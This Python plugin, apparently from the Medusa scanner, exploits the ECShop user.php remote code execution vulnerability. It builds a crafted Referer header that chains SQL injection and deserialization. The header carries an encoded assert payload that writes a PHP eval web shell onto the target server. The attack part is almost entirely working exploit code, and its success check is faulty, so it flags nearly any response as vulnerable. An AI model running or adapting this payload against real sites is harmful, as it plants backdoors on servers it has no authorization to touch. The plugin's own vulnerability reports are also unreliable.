#!/usr/bin/env python
# -*- coding: utf-8 -*-
import random
import requests
import base64
import binascii
from ClassCongregation import UrlProcessing,VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling,Proxies

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['create_date'] = "2020-04-20"  # 插件编辑时间
        self.info['disclosure']='2018-09-03'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "EcshopRemoteCodeExecutionVulnerability"  # 插件名称
        self.info['name'] ='Ecshop远程代码执行漏洞' #漏洞名称
        self.info['affects'] = "Ecshop"  # 漏洞组件
        self.info['desc_content'] = "ECShop是一款B2C独立网店系统适合企业及个人快速构建个性化网上商店系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序ECShop全系列版本存在远程代码执行漏洞该漏洞是由于ECShop系统的user.php文件中display函数的模板变量可控攻击者无需登录等操作获得服务器的权限"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "全版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(Url,RandomAgent,Token,proxies=None):
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = '/user.php?act=login'
        payload_url = scheme + "://" + url +":"+ str(port) + payload
        randstr = chr(random.randint(96, 122))
        filename_poc = randstr + '.txt'
        exp = "file_put_contents('{filename}','<?php eval($_GET[wss]); ?>')".format(filename=filename_poc)
        exp_base64 = '''{$asd'];assert(base64_decode('%s'));//}xxx''' % base64.b64encode(exp.encode('utf-8')).decode('ascii')
        exp_hex = binascii.b2a_hex(exp_base64.encode('utf-8')).decode('ascii')
        refer = '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x%s,10-- -";s:2:"id";s:3:"'/*";}''' % exp_hex
        headers = {
            'User-Agent': RandomAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Referer': refer
        }
        s = requests.session()
        resp = s.get(payload_url, headers=headers, timeout=6, proxies=proxies, verify=False)
        con = resp.text
        code = resp.status_code
        if con.find("wss") :
            Medusa = "{}存在Ecshop远程代码执行漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,Token).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
